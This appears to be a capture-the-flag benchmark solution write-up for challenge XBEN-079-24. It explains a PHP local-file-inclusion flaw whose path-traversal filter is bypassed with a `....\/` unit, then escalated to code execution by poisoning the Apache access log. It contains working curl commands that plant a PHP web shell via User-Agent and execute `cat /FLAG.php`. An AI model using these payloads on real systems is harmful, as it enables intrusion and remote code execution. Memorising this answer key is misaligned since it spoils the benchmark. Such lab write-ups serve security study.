# XBEN-079-24 — Poison Inclusion - Protected

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vulnerability class:** Local File Inclusion (LFI) with a bypassable path-traversal
filter, escalated to Remote Code Execution via Apache access-log poisoning.

## Summary

`app/website/post.php` includes a blog post file chosen by the `id` GET parameter:

```php
$post_id = $_GET['id'];
$posts_path = "posts/";
// Remove any attempts to include directories
$post_id = str_replace(['../', './', '..\\', '.\\'], '', $post_id);
$file_to_include = $posts_path . $post_id;

if (file_exists($file_to_include)) {
    include($file_to_include);
} else {
    echo "<p>Post not found.</p>";
}
```

**Filter bypass.** `str_replace()` with an array of search terms applies each search
*sequentially* to the result of the previous one (`../` removed first, then `./`, then
`..\`, then `.\`), not recursively/repeatedly. The classic `....//` double-write trick fails
here because the *second* pass (removing `./`) eats the tail of whatever `../` the first
pass's removal left behind. However, a unit crafted as `....\/` (four dots, one backslash,
one forward slash) survives all four passes intact: pass 1 (`../`) does not match (no `.`
immediately before the `/`), pass 2 (`./`) does not match either, but pass 3 (`..\`) matches
at the two middle dots + backslash, and removing it leaves exactly `../` behind. Repeating
that unit several times and appending a target path yields real `../../../.../target`
(confirmed with a Python simulation and directly against PHP's `str_replace`), enough to
escape `posts/` and reach any file whose name can be guessed, given `file_exists()` and
`include()` both walk the same resolved OS path.

**From LFI to RCE.** The target flag, `/FLAG.php`, contains
`<?php FLAG{<hash>} ?>` (baked in by the Dockerfile) — this is **not valid PHP syntax**
(`FLAG{...}` is a parse error), so directly `include()`-ing it produces a compile-time fatal
error and an empty (0-byte) HTTP response — no flag leaks that way. The Dockerfile also
conspicuously leaves `/var/log/apache2/access.log` world-writable
(`chmod 0777 /var/log/apache2/access.log`), the standard hint for **log poisoning**: Apache
logs the request's `User-Agent` verbatim into that file. Sending a request with
`User-Agent: <?php system($_GET['cmd']); ?>` plants live PHP in the log; then using the same
LFI bypass to `include()` `posts/../../../.../var/log/apache2/access.log` causes PHP to parse
the whole log as a script — plain log lines pass through as harmless HTML-mode text, but our
injected `<?php ... ?>` block executes, running `cat /FLAG.php` and printing its raw bytes
(as plain text, never re-parsed as PHP) directly into the response.

(Practical note: log entries must use **single quotes** in the payload —
`$_GET['cmd']`, not `$_GET["cmd"]` — because Apache's combined log format backslash-escapes
literal `"` characters inside logged fields, which corrupts a double-quoted payload into
invalid PHP. Also, since PHP compiles the *entire* included file in one pass, any earlier
malformed injected payload left in the log will break the whole include with a parse error
even if a later, well-formed payload is also present — so start from a clean log, e.g. a
freshly started container, before poisoning it.)

## Exploit

1. Poison the Apache access log with a PHP one-liner via the `User-Agent` header (single
   quotes, to survive Apache's log-escaping):

```bash
PORT=65120
curl -s -A "<?php system(\$_GET['cmd']); ?>" "http://localhost:$PORT/" -o /dev/null
```

2. Trigger the LFI against `post.php`, path-traversing into the access log (using the
   `....\/` filter-bypass unit, repeated, to survive the `str_replace()` blacklist), and
   pass a `cmd` parameter that our injected code will execute:

```bash
URL="http://localhost:$PORT/post.php?id=....%5C/....%5C/....%5C/....%5C/....%5C/....%5C/var/log/apache2/access.log&cmd=cat%20/FLAG.php"
curl -s "$URL"
```
